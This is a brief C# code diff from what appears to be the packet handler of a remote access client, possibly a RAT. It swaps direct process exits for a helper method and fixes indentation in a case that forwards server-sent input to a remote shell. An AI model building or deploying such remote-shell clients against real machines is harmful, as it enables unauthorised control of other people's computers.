@@ -85,7 +85,7 @@ namespace Client.Handle_Packet
                                 ClientSocket.Client.Dispose();
                             }
                             catch { }
-                            Environment.Exit(0);
+                            Methods.ClientExit();
                             break;
                         }
 
@@ -98,7 +98,7 @@ namespace Client.Handle_Packet
                             }
                             catch { }
                             Process.Start(Application.ExecutablePath);
-                            Environment.Exit(0);
+                            Methods.ClientExit();
                             break;
                         }
 
@@ -270,7 +270,7 @@ namespace Client.Handle_Packet
                     case "shellWriteInput":
                         {
                             if (HandleShell.ProcessShell != null)
-                            HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
+                                HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                             break;
                         }
 
